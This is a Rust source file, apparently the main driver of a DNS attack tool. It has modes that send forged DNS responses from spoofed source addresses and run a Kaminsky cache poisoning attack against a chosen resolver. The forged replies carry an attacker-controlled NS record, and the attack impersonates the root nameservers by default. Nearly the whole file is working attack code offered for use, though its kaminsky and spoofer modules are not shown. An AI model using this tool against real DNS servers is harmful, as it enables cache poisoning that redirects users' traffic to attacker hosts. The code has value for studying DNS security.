use std::ffi::OsStr;
use std::net::Ipv4Addr;
use std::time::Duration;
use structopt::StructOpt;

mod dns;
mod kaminsky;
mod spoofer;

#[derive(Debug, StructOpt)]
struct Cli {
    /// Valid modes are "query", "spoof", and "attack"
    ///
    /// Query mode runs a DNS query for an A record
    ///
    /// Spoof mode spoofs a DNS response for an A record along with an NS record in the Authority
    /// section
    ///
    /// Attack mode runs a Kaminsky DNS cache poisoning attack
    #[structopt(parse(from_os_str), short, long)]
    mode: Mode,

    // #####################################
    // ###  Arguments for multiple modes ###
    // #####################################
    /// IP address to send spoofed replies to, only valid for spoof or attack mode
    ///
    /// For attack mode, this specifies the server whose cache will be poisoned
    #[structopt(required_ifs(&[("mode", "attack"), ("mode", "spoof")]), parse(try_from_str), long)]
    target_addr: Option<Ipv4Addr>,

    /// IP addresses to spoof responses from, only valid for spoof or attack modes
    ///
    /// For attack mode, these should be the IPs for the nameservers for the domain you are trying
    /// to attack.
    ///
    /// For spoof mode, only the first address will be used
    #[structopt(required_if("mode", "spoof"), long)]
    spoofed_addrs: Option<Vec<Ipv4Addr>>,

    /// Hostname to query or spoof a response for, e.g. www.example.com, only valid for query or spoof modes
    #[structopt(required_ifs(&[("mode", "query"), ("mode", "spoof")]), long)]
    hostname: Option<String>,

    /// Nameserver to advertise as authoritative for the target domain, only valid for attack mode or spoof mode
    #[structopt(required_ifs(&[("mode", "attack"), ("mode", "spoof")]), long)]
    attacker_ns: Option<String>,

    // ###################################
    // ###  Query mode only arguments  ###
    // ###################################
    /// IP or hostname of DNS server to query, only valid for query mode
    #[structopt(required_if("mode", "query"), long)]
    dns_server: Option<String>,

    // ###################################
    // ###  Spoof mode only arguments  ###
    // ###################################
    /// IP address that will be returned as an A record for the spoofed hostname, only valid for spoof mode
    #[structopt(required_if("mode", "spoof"), long)]
    spoofed_response: Option<Ipv4Addr>,

    // ####################################
    // ###  Attack mode only arguments  ###
    // ####################################
    /// domain to target, e.g. example.com, only valid for attack mode
    #[structopt(required_if("mode", "attack"), long)]
    target_domain: Option<String>,

    /// how long to run the attack for in seconds, only valid for attack mode
    #[structopt(long)]
    duration: Option<f32>,
}

#[derive(Debug)]
enum Mode {
    /// sends a DNS query for an A record
    QUERY,
    /// spoofs a DNS response
    SPOOF,
    /// runs a Kaminsky attack
    ATTACK,
    UNKNOWN,
}

// TODO: should implement FromStr which allows a result to be returned rather than From
impl From<&OsStr> for Mode {
    fn from(string: &OsStr) -> Self {
        return match string.to_str() {
            Some(s) => match s {
                "query" => Mode::QUERY,
                "spoof" => Mode::SPOOF,
                "attack" => Mode::ATTACK,
                _ => Mode::UNKNOWN,
            },
            None => Mode::UNKNOWN,
        };
    }
}

fn query(hostname: String, dns_server: String) {
    let client = dns::Client::new(dns_server);

    let request = dns::Query::new(vec![hostname]);
    let result = client.query(request);

    match result {
        Err(e) => eprintln!("{}", e),
        Ok(m) => println!("{:?}", m),
    }
}

fn spoof(
    spoofed_addr: &Ipv4Addr,
    target_addr: &Ipv4Addr,
    spoofed_response_hostname: String,
    attacker_ns: &str,
    spoofed_response: &Ipv4Addr,
) {
    let request = dns::Query::new(vec![spoofed_response_hostname.clone()]);

    let mut response = dns::Response::new(request.to_message().unwrap());
    response
        .add_answer(dns::Record::A(dns::ARecord {
            name: spoofed_response_hostname.clone(),
            ttl: 0, // we do not cache to avoid caching the random record
            ip: spoofed_response.octets(),
        }))
        .unwrap();
    response
        .add_authority(dns::Record::NS(dns::NSRecord {
            // drop the prefix from the hostname to get the domain
            name: spoofed_response_hostname
                .split(".")
                .skip(1)
                .collect::<Vec<&str>>()
                .join("."),
            ttl: 0, // we do not cache to avoid caching the bad ns record
            ns: String::from(attacker_ns),
        }))
        .unwrap();

    let response_bytes = response.to_message().unwrap().to_bytes();

    let mut _spoofer =
        spoofer::Spoofer::new(spoofed_addr, target_addr, response_bytes.len()).unwrap();
    _spoofer.send_bytes(&response_bytes).unwrap();
    println!("Sent spoofed bytes");
}

fn attack(
    attacker_ns: &str,
    target_domain: &str,
    target_addr: &Ipv4Addr,
    duration: Option<f32>,
    spoofed_addrs: &Vec<Ipv4Addr>,
) {
    let _duration = match duration {
        Some(d) => Duration::from_secs_f32(d),
        None => Duration::new(5, 0),
    };

    let default_root_servers = vec![
        Ipv4Addr::new(198, 41, 0, 4),
        Ipv4Addr::new(192, 228, 79, 201),
        Ipv4Addr::new(192, 33, 4, 12),
        Ipv4Addr::new(199, 7, 91, 13),
        Ipv4Addr::new(192, 203, 230, 10),
        Ipv4Addr::new(192, 5, 5, 241),
        Ipv4Addr::new(192, 112, 36, 4),
        Ipv4Addr::new(198, 97, 190, 53),
        Ipv4Addr::new(192, 36, 148, 17),
        Ipv4Addr::new(192, 58, 128, 30),
        Ipv4Addr::new(193, 0, 14, 129),
        Ipv4Addr::new(199, 7, 83, 42),
        Ipv4Addr::new(202, 12, 27, 33),
    ];

    let _spoofed_addrs = if !spoofed_addrs.is_empty() {
        spoofed_addrs
    } else {
        &default_root_servers
    };

    println!("Commencing attack");
    kaminsky::attack(
        attacker_ns,
        target_domain,
        target_addr,
        _spoofed_addrs,
        _duration,
        Duration::new(0, 0),
    )
    .unwrap();
    println!("Attack complete");
}

fn main() {
    let args = Cli::from_args();

    match args.mode {
        Mode::QUERY => query(args.hostname.unwrap(), args.dns_server.unwrap()),
        Mode::SPOOF => spoof(
            &args.spoofed_addrs.unwrap()[0],
            &args.target_addr.unwrap(),
            args.hostname.unwrap(),
            &args.attacker_ns.unwrap(),
            &args.spoofed_response.unwrap(),
        ),
        Mode::ATTACK => attack(
            &args.attacker_ns.unwrap(),
            &args.target_domain.unwrap(),
            &args.target_addr.unwrap(),
            args.duration,
            &args.spoofed_addrs.unwrap(),
        ),
        Mode::UNKNOWN => {
            eprintln!("Unknown mode, please enter either query, spoof, or attack for the mode")
        }
    }
}
